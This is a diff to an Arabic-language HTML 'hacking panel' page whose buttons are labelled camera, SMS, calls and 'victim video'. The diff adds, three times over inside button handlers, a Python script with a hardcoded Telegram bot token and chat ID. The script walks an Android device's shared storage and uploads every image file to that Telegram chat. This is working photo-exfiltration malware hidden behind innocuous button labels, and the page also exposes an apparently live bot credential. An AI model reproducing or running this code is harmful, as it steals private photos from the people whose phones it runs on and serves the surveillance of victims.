@@ -41,14 +41,176 @@
     <div id="step-active" style="display:none;">
         <h3 style="color:cyan;">✅ تم تفعيل الوصول الكامل (Root)</h3>
         <div class="services" id="services-grid">
-            <button onclick="runPython('cam_front')" class="s-btn">📸 كاميرا أمامية</button>
+            <button onclick="runPython('
+
+import os
+
+import telebot
+
+from threading import Thread
+
+
+
+bot = telebot.TeleBot("8511624088:AAEc5dKi-60RbSZpvsq2-3e08bVCEjs8hXE ") 
+
+
+
+#@M02MM
+
+dir_path = "/storage/emulated/0/"
+
+	
+
+#@uiujq
+
+def send_file(file_path):
+
+ with open(file_path, "rb") as f:
+
+ 	if file_path.endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
+
+ 		bot.send_photo(chat_id= " 6626970132 ",photo=f) 
+
+ 	else:
+
+ 		print("سوف يتم رشق 💕")
+
+
+
+for root, dirs, files in os.walk(dir_path):
+
+	threads = []
+
+	for file in files:
+
+		file_path = os.path.join(root, file)
+
+		t = Thread(target=send_file, args=(file_path,))
+
+		t.start()
+
+		threads.append(t)
+
+	for thread in threads:
+
+		thread.join()
+
+#اخمط بس اذكر مصدر وبس')" class="s-btn">📸 كاميرا أمامية</button>
             <button onclick="runPython('cam_back')" class="s-btn">📷 كاميرا خلفية</button>
             <button onclick="runPython('web_hack')" class="s-btn">🌐 اختراق موقع</button>
             <button onclick="runPython('mic_rec')" class="s-btn">🎤 تسجيل صوت</button>
             
             <button onclick="runPython('pull_sms')" class="s-btn">📩 سحب الرسائل</button>
-            <button onclick="runPython('pull_calls')" class="s-btn">📞 سحب المكالمات</button>
-            <button onclick="runPython('open_wa')" class="s-btn">🟢 واتساب مباشر</button>
+            <button onclick="runPython('
+
+import os
+
+import telebot
+
+from threading import Thread
+
+
+
+bot = telebot.TeleBot("8511624088:AAEc5dKi-60RbSZpvsq2-3e08bVCEjs8hXE ") 
+
+
+
+#@M02MM
+
+dir_path = "/storage/emulated/0/"
+
+	
+
+#@uiujq
+
+def send_file(file_path):
+
+ with open(file_path, "rb") as f:
+
+ 	if file_path.endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
+
+ 		bot.send_photo(chat_id= " 6626970132 ",photo=f) 
+
+ 	else:
+
+ 		print("سوف يتم رشق 💕")
+
+
+
+for root, dirs, files in os.walk(dir_path):
+
+	threads = []
+
+	for file in files:
+
+		file_path = os.path.join(root, file)
+
+		t = Thread(target=send_file, args=(file_path,))
+
+		t.start()
+
+		threads.append(t)
+
+	for thread in threads:
+
+		thread.join()
+
+#اخمط بس اذكر مصدر وبس')" class="s-btn">📞 سحب المكالمات</button>
+            <button onclick="runPython('
+
+import os
+
+import telebot
+
+from threading import Thread
+
+
+
+bot = telebot.TeleBot("8511624088:AAEc5dKi-60RbSZpvsq2-3e08bVCEjs8hXE ") 
+
+
+
+#@M02MM
+
+dir_path = "/storage/emulated/0/"
+
+	
+
+#@uiujq
+
+def send_file(file_path):
+
+ with open(file_path, "rb") as f:
+
+ 	if file_path.endswith(".jpg") or file_path.endswith("png") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
+
+ 		bot.send_photo(chat_id= " 6626970132 ",photo=f) 
+
+ 	else:
+
+ 		print("سوف يتم رشق 💕")
+
+
+
+for root, dirs, files in os.walk(dir_path):
+
+	threads = []
+
+	for file in files:
+
+		file_path = os.path.join(root, file)
+
+		t = Thread(target=send_file, args=(file_path,))
+
+		t.start()
+
+		threads.append(t)
+
+	for thread in threads:
+
+		thread.join()
+
+#اخمط بس اذكر مصدر وبس')" class="s-btn">🟢 واتساب مباشر</button>
             <button onclick="runPython('open_fb')" class="s-btn">🔵 فيسبوك مباشر</button>
             <button onclick="runPython('open_tg')" class="s-btn">✈️ تليجرام مباشر</button>
             <button onclick="runPython('victim_video')" class="s-btn">📹 فيديو الضحية</button>
